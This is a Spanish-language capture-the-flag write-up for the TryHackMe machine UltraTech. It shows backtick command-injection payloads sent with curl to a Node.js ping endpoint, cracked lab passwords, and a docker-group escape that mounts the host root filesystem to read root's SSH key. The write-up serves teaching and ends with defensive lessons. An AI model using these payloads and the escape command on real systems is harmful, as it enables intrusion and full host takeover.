# CTF Writeup – UltraTech

## Información General

|Campo|Valor|
|---|---|
|Plataforma|TryHackMe|
|Dificultad|Medium|
|Sistema Operativo|Linux (Ubuntu 20.04)|
|IP Objetivo|10.64.142.103|
|Fecha|04/02/2026|
|Puntos|[X puntos]|

Tags: `#ctf` `#tryhackme` `#medium` `#rce` `#docker-escape` `#nodejs`

---

## Objetivo

- User Flag: Obtenida vía SSH como `r00t`
    
- Root Flag: Obtenida mediante Docker Escape
    

---

## Reconocimiento

### Nmap Scan

Comando:

`nmap -Pn -n -sC -sV -p21,22,8081,31331 10.64.142.103`

Resultado:

`PORT      STATE SERVICE VERSION 21/tcp    open  ftp     vsftpd 3.0.5 22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 8081/tcp  open  http    Node.js Express framework 31331/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))`

### Puertos Abiertos

|Puerto|Servicio|Versión|
|---|---|---|
|21|FTP|vsftpd 3.0.5|
|22|SSH|OpenSSH 8.2p1|
|8081|HTTP (API)|Node.js Express|
|31331|HTTP (Web)|Apache 2.4.41|

---

## Herramientas Utilizadas

- Reconocimiento: nmap, gobuster, dirb
    
- Explotación: curl, hashcat
    
- Post-explotación: docker
    

---

## Enumeración Web

### Fuzzing de Directorios (Puerto 31331)

- /index.html – Landing page de UltraTech
    
- /robots.txt – Contiene pistas sobre la estructura
    
- /partners.html – Página que interactúa con la API en el puerto 8081
    

### Tecnologías Detectadas

- Backend API: Node.js con Express (puerto 8081)
    
- Base de datos: SQLite (utech.db.sqlite)
    
- Frontend: Apache HTTP Server
    

---

## Vulnerabilidades Encontradas

### [VULN-001] Command Injection (RCE) vía Backticks

Severidad: Crítica

Descripción:  
El endpoint `/ping` de la API en el puerto 8081 no sanitiza correctamente los backticks (`). Aunque se filtran caracteres como` ;`,` &`y`$`, el uso de backticks permite ejecutar comandos arbitrarios en el sistema.

Evidencia:

``curl "http://10.64.142.103:8081/ping?ip=`ls`"``

Respuesta:

`utech.db.sqlite index.js package.json`

---

## Explotación

### Acceso Inicial

1. Extracción de la base de datos SQLite:
    

``curl "http://10.64.142.103:8081/ping?ip=`cat utech.db.sqlite`"``

2. Credenciales obtenidas tras crackear hashes MD5:
    

|Usuario|Contraseña|
|---|---|
|admin|mrsheafy|
|r00t|n100906|

3. Acceso vía SSH:
    

`ssh r00t@10.64.142.103`

Shell obtenida como `r00t` (usuario del sistema, no root real).

---

## Escalación de Privilegios

### Enumeración del Sistema

- El usuario `r00t` pertenece al grupo `docker`
    
- Se detecta un cron job que reinicia la API mediante el script:
    
    `/home/www/api/start.sh`
    

---

## Vector de Escalación: Docker Escape

Al pertenecer al grupo `docker`, es posible montar el sistema de archivos del host dentro de un contenedor y obtener acceso root.

Pasos:

1. Listar imágenes disponibles:
    

`docker images`

2. Ejecutar contenedor montando la raíz del sistema:
    

`docker run -v /:/mnt --rm -it bash chroot /mnt sh`

---

## Root Flag

Ubicación:

`/root/.ssh/id_rsa`

Flag:  
Primeros 9 caracteres de la clave privada:

`MIIEogIBA`

---

## Credenciales Encontradas

|Usuario|Contraseña|Servicio|
|---|---|---|
|r00t|n100906|SQLite DB / SSH|
|admin|mrsheafy|SQLite DB|

---

## Lecciones Aprendidas

- Las listas negras no son suficientes para prevenir Command Injection
    
- Un usuario en el grupo docker equivale a acceso root
    
- Ejecutar comandos del sistema desde una API es una práctica de alto riesgo
    

---
# Priv Escalation Docker

La escalada de privilegios fue posible debido a que el usuario **r00t** pertenecía al grupo **`docker`**. En Linux, esto permite ejecutar contenedores con permisos de **root real** sobre el host.

**¿Cómo funcionó el ataque?**

1. **Abuso de Privilegios:** El demonio de Docker (el "motor" que corre los contenedores) tiene permisos totales en el sistema. Al ser parte del grupo, pude darle órdenes directas.
    
2. **Montaje de Volumen:** Utilicé el comando `-v /:/mnt`, que obliga a Docker a "mapear" todo el disco duro de la máquina real dentro de mi contenedor.
    
3. **Acceso Total:** Una vez dentro del contenedor, el aislamiento desapareció. Al usar `chroot`, salté del entorno limitado del contenedor directamente al sistema de archivos del servidor host con identidad de **UID 0 (Root)**.
    

**Conclusión:** Pertenecer al grupo `docker` es, para fines prácticos, tener acceso de administrador total (sudo) sin restricciones, ya que permite saltarse todas las barreras de permisos del sistema operativo.

```
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```
#docker